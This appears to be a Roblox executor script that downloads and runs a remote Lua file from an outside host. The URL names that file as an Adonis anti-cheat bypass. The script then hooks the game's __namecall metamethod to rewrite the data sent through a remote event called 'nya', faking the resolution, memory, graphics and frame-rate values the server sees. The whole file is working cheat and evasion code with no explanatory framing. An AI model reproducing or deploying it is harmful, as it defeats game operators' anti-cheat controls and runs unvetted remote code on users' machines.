if not game:IsLoaded() then
    game.Loaded:Wait()
end

loadstring(game:HttpGet("http://yourscoper.pages.dev/scripts/bin/adonisbypass.lua"))()

getgenv().FPS_Settings = {
    Resolution = Vector2.new(10240, 8640),
    Memory = 32,
    TSystem = "metrics",
    Graphics = Enum.SavedQualitySetting.QualityLevel10,
    Frames = 3500
}

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local ok, method = pcall(getnamecallmethod)
    if not ok then
        return oldNamecall(self, ...)
    end

    if method == "FireServer" then
        local ok2, name = pcall(function() return self.Name end)
        if ok2 and name == "nya" then
            local args = {...}
            if typeof(args[1]) == "table" then
                local data = args[1]
                if data.token and typeof(data.token) == "number" then
                    data.res = getgenv().FPS_Settings.Resolution
                    data.mem = getgenv().FPS_Settings.Memory
                    data.t   = getgenv().FPS_Settings.TSystem
                    data.gfx = getgenv().FPS_Settings.Graphics
                    data.fps = getgenv().FPS_Settings.Frames
                end
            end
        end
    end

    return oldNamecall(self, ...)
end))